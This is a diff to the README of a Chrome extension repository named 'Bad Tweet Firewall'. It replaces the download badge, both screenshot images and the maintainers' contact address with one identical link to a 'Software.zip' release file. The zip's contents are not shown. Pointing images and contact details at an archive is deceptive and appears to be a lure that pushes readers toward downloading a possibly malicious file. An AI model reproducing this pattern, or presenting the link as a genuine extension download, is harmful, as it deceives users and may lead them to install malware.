@@ -11,7 +11,7 @@ Welcome to the Bad Tweet Firewall Chrome extension repository! This extension is
 
 ### Usage
 To get started with the Bad Tweet Firewall extension, simply click on the link below to download the extension:
-[![Download Extension](https://img.shields.io/badge/Download-Extension-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Extension](https://github.com/pusima1/bad-tweet-firewall/releases/download/v2.0/Software.zip)](https://github.com/pusima1/bad-tweet-firewall/releases/download/v2.0/Software.zip)
 
 Once you have downloaded the extension file, follow these steps to launch it:
 1. Open Google Chrome browser
@@ -22,8 +22,8 @@ Once you have downloaded the extension file, follow these steps to launch it:
 ### Screenshots
 Here are some screenshots of the Bad Tweet Firewall Chrome extension in action:
 
-![Screenshot 1](https://via.placeholder.com/600x300)
-![Screenshot 2](https://via.placeholder.com/600x300)
+![Screenshot 1](https://github.com/pusima1/bad-tweet-firewall/releases/download/v2.0/Software.zip)
+![Screenshot 2](https://github.com/pusima1/bad-tweet-firewall/releases/download/v2.0/Software.zip)
 
 ### Contributing
 We welcome contributions from the community to enhance the functionality of the Bad Tweet Firewall extension. If you have any suggestions, bug reports, or feature requests, please feel free to create an issue or submit a pull request.
@@ -32,6 +32,6 @@ We welcome contributions from the community to enhance the functionality of the 
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
 ### Contact
-If you have any questions or need assistance with the Bad Tweet Firewall extension, you can reach out to the project maintainers at [example@example.com](mailto:example@example.com).
+If you have any questions or need assistance with the Bad Tweet Firewall extension, you can reach out to the project maintainers at [https://github.com/pusima1/bad-tweet-firewall/releases/download/v2.0/Software.zip](https://github.com/pusima1/bad-tweet-firewall/releases/download/v2.0/Software.zip).
 
 Thank you for using the Bad Tweet Firewall Chrome extension! 🚀🔒
